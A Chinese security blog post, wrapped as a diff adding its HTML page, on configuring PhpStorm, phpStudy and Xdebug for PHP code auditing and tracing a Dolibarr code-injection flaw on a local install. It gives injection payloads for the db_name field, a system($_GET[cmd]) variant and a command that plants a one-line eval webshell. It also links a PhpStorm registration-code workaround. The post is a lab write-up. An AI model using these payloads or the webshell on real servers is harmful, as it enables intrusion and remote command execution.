@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="代码审计," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Secer" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Phpstorm+phpstudy+xdebug代码审计平台">
+<meta property="og:url" content="http://yoursite.com/2018/08/08/Phpstorm-phpstudy-xdebug代码审计平台/index.html">
+<meta property="og:site_name" content="Secer">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/images/pasted-19.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-20.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-21.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-22.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-23.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-24.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-25.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-26.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-27.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-28.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-29.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-30.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-31.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-32.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-33.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-34.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-35.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-36.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-37.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-38.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-39.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-40.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-41.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-42.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-43.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-44.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-45.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-46.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-47.png">
+<meta property="og:image" content="http://yoursite.com/images/pasted-48.png">
+<meta property="og:updated_time" content="2018-08-12T15:30:58.520Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Phpstorm+phpstudy+xdebug代码审计平台">
+<meta name="twitter:image" content="http://yoursite.com/images/pasted-19.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/08/08/Phpstorm-phpstudy-xdebug代码审计平台/"/>
+
+
+
+
+
+  <title>Phpstorm+phpstudy+xdebug代码审计平台 | Secer</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Secer</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/08/Phpstorm-phpstudy-xdebug代码审计平台/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="shiqian">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Secer">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Phpstorm+phpstudy+xdebug代码审计平台</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-08T21:20:01+08:00">
+                2018-08-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/代码审计/" itemprop="url" rel="index">
+                    <span itemprop="name">代码审计</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<a id="more"></a>
+<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote>
+<p>PhpStorm 是 JetBrains 公司开发的一款商业的 PHP  集成开发工具，旨在提高用户效率，可深刻理解用户的编码，提供智能代码补全，快速导航以及即时错误检查。phpStudy是一个PHP调试环境的程序集成包。该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境·该程序不仅包括PHP调试环境，还包括了开发工具、开发手册等·总之学习PHP只需一个包。</p>
+</blockquote>
+<h3 id="【准备】"><a href="#【准备】" class="headerlink" title="【准备】"></a>【准备】</h3><p><strong>先从网上下载PhpStorm和Phpstudy软件，版本不限定。在第一次打开Phpstorm时，需要输入注册码，具体方法可参考<a href="https://blog.csdn.net/finish_dream/article/details/80045514" target="_blank" rel="noopener">https://blog.csdn.net/finish_dream/article/details/80045514</a> 亲测有效。</strong></p>
+<h3 id="【配置步骤】"><a href="#【配置步骤】" class="headerlink" title="【配置步骤】"></a>【配置步骤】</h3><p><strong>进行phpStudy+PhpStorm+XDebug的配置，因为phpStudy集成了XDebug扩展，所以不用单独下载XDebug。</strong></p>
+<p><strong>1.phpStudy当前版本确定，我们用PHP-5.5.38的版本。</strong></p>
+<p><img src="\images\pasted-19.png" alt="upload successful"></p>
+<p><strong>2.在其他选项菜单-&gt;打开配置文件-&gt;php.ini，滑到最后看到[XDebug]节点做如下的修改：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[XDebug]</span><br><span class="line"></span><br><span class="line">;性能分析文件的存放位置，默认值为/tmp</span><br><span class="line"></span><br><span class="line">xdebug.profiler_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;</span><br><span class="line"></span><br><span class="line">;函数调用跟踪信息输出文件目录，默认值为/tmp</span><br><span class="line"></span><br><span class="line">xdebug.trace_output_dir=&quot;G:\PHP\PhpStudy\tmp\xdebug&quot;</span><br><span class="line"></span><br><span class="line">;zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;</span><br><span class="line"></span><br><span class="line">zend_extension=&quot;G:\PHP\PhpStudy\php\php-5.5.38\ext\php_xdebug.dll&quot;</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数调用，跟踪信息以文件形式存储，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.auto_trace=1</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数参数，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.collect_params=1</span><br><span class="line"></span><br><span class="line">;是否允许Xdebug跟踪函数返回值，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.collect_return=1</span><br><span class="line"></span><br><span class="line">;打开xdebug的性能分析器，以文件形式存储，这项配置是不能以ini_set()函数配置的，默认值为0</span><br><span class="line"></span><br><span class="line">xdebug.profiler_enable = 1</span><br><span class="line"></span><br><span class="line">;性能分析文件的命名规则，默认值为cachegrind.out.%p</span><br><span class="line"></span><br><span class="line">xdebug.profiler_output_name = &quot;cachegrind.out.%t.%p&quot;</span><br><span class="line"></span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line"></span><br><span class="line">;用于zend studio远程调试的应用层通信协议</span><br><span class="line"></span><br><span class="line">xdebug.remote_handler = &quot;dbgp&quot;</span><br><span class="line"></span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line"></span><br><span class="line">xdebug.remote_host = &quot;127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line">xdebug.remote_port = 9000</span><br></pre></td></tr></table></figure>
+<p><strong>3.打开Phpstorm，需要打开或者新创一个项目，这里我们打开Phpstudy的根目录作为项目。在PhpStudy软件的解压目录下的www文件夹就是我们的网站根目录。</strong></p>
+<p><img src="\images\pasted-20.png" alt="upload successful"></p>
+<p>open -&gt;选择相应目录的WWW文件，点OK，再点OK 完成项目的创建。</p>
+<p><img src="\images\pasted-21.png" alt="upload successful"></p>
+<p><strong>4.选择PHP的版本信息。</strong> </p>
+<p><img src="\images\pasted-22.png" alt="upload successful"><br>Debug端口设置 </p>
+<p><img src="\images\pasted-23.png" alt="upload successful"><br>IDEKEY： </p>
+<p><img src="\images\pasted-24.png" alt="upload successful"><br>配置PHP Web Application </p>
+<p><img src="\images\pasted-25.png" alt="upload successful"><br>查看配置： </p>
+<p><img src="\images\pasted-26.png" alt="upload successful"><br>debug配置完成了</p>
+<p><strong>3.实现截取操作</strong></p>
+<p>在火狐或是谷歌浏览器中下载插件Xdebug helper，图标为一只吃虫子的标志。点击Debug启动Xdebug helper。</p>
+<p><img src="\images\pasted-27.png" alt="upload successful"><br>在Pphstorm中写好一个php文件，并开启如下的选项，左上角的电话图标。 </p>
+<p><img src="\images\pasted-28.png" alt="upload successful"><br>选择一个浏览器打开写好的文件 </p>
+<p><img src="\images\pasted-29.png" alt="upload successful"><br>截取到了内容，或者你点击网页的刷新，会在phpstrom中打开相应的php文件，也说明截取到了 </p>
+<p><img src="\images\pasted-30.png" alt="upload successful"></p>
+<h4 id="Dolibarr-ERP-CRM-php代码注入漏洞"><a href="#Dolibarr-ERP-CRM-php代码注入漏洞" class="headerlink" title="Dolibarr ERP/CRM php代码注入漏洞"></a>Dolibarr ERP/CRM php代码注入漏洞</h4><p><strong>Dolibarr ERP &amp; CRM是一个用于管理的组织的活动(联系人、供应商、发票、订单、股票、议程…)。它是一个用PHP语言编写的开源软件，支持mysql,mssql,pgsql。专为小型、中型或大型公司、基金会和自由职业者设计。</strong></p>
+<p><strong>1、先配置好Dolibarr环境。</strong></p>
+<p>将Dolibarr的压缩包解压到PhpStudy的WWW的目录下。</p>
+<p><img src="\images\pasted-31.png" alt="upload successful"><br>然后打开Phpstuduy，点击其他选项菜单-&gt;Phpstudy设置-&gt;端口常规设置，在网站目录中选择dolibarr目录中的hedocs文件，然后点击应用。 </p>
+<p><img src="\images\pasted-32.png" alt="upload successful"><br>打开浏览器输入127.0.0.1/install </p>
+<p><img src="\images\pasted-33.png" alt="upload successful"><br>然后点击开始进行dolibarr的安装。账户密码均为root，然后一直下一步，直至安装完毕。 </p>
+<p><img src="\images\pasted-34.png" alt="upload successful"><br>安装完毕后，会在Phpstrom中自动截取到step1.php的文件。 </p>
+<p><img src="\images\pasted-35.png" alt="upload successful"><br><strong>2、开始代码的修改。</strong></p>
+<p>step1.php文件第55行接受了我们传递的db_name参数并执行了GETPOST方法</p>
+<p><img src="\images\pasted-36.png" alt="upload successful"><br>按F7跟进GETPOST，在functions.lib.php第512行，GETPOST方法根据接收的check值进行不同的操作，此处接收的check值为alpha。我们看到在switch的alpha代码块中，对db_name的值进行了双引号和../的过滤。 </p>
+<p><img src="\images\pasted-37.png" alt="upload successful"></p>
+<p>ALT+SHIFT=F7跳回step1.php,在接收了全部参数，并确定没有错误的情况下。在文件517行对配置文件进行了备份并调用write_conf_file方法将参数写入配置文件。 </p>
+<p><img src="\images\pasted-38.png" alt="upload successful"><br>继续跟进528行write_conf_file,函数首先定义了所需要的全局变量来获取参数值，并把配置写入/conf/conf.php文件。</p>
+<p><img src="\images\pasted-39.png" alt="upload successful"><br>继续往下走，直接定位到写入数据库名称的代码段 </p>
+<p><img src="\images\pasted-40.png" alt="upload successful"><br>提交时前台会有js检测，用burp来截断修改我们的参数值，注意在提交时要勾选创建数据库复选框，否则配置文件写入不成功。<br>数据库名称改为dolibarr \’;phpinfo();//<br><img src="\images\pasted-41.png" alt="upload successful"><br>配置文件也进行了正常写入，但是虽然已经正常写入了代码，如果直接访问配置文件被阻止 </p>
+<p><img src="\images\pasted-42.png" alt="upload successful"><br>通过包含此文件的文件去间接的执行代码</p>
+<p><img src="\images\pasted-43.png" alt="upload successful"><br>更改payload，执行系统命令并getshell </p>
+<p><img src="\images\pasted-44.png" alt="upload successful"><br>将db_name改为dolibarr \’;system($_GET[cmd]);// </p>
+<p><img src="\images\pasted-45.png" alt="upload successful"><br>访问/insex.php?cmd={command} </p>
+<p><img src="\images\pasted-46.png" alt="upload successful"><br>修改命令为echo “&lt;?php @eval($_POST[topsec])?&gt;”&gt; 网站绝对路径/shell.php </p>
+<p><img src="\images\pasted-47.png" alt="upload successful"></p>
+<p>请求后会在网站根目录下生成一句话木马，尝试用菜刀连接</p>
+<p><img src="\images\pasted-48.png" alt="upload successful"></p>
+
+      
+    </div>
+	
+	<div>
+	
+		<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>史前感谢您的来访-------------</div>
+    
+</div>
+	
+	</div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/26/burpsuite神器指北/" rel="next" title="Burpsuite神器指北">
+                <i class="fa fa-chevron-left"></i> Burpsuite神器指北
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/09/白帽子讲web安全全—-读书笔记/" rel="prev" title="白帽子讲web安全—-读书笔记">
+                白帽子讲web安全—-读书笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">shiqian</p>
+              <p class="site-description motion-element" itemprop="description">繁华一场梦</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#【前言】"><span class="nav-number">1.</span> <span class="nav-text">【前言】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#【准备】"><span class="nav-number">2.</span> <span class="nav-text">【准备】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#【配置步骤】"><span class="nav-number">3.</span> <span class="nav-text">【配置步骤】</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Dolibarr-ERP-CRM-php代码注入漏洞"><span class="nav-number">3.1.</span> <span class="nav-text">Dolibarr ERP/CRM php代码注入漏洞</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">shiqian</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
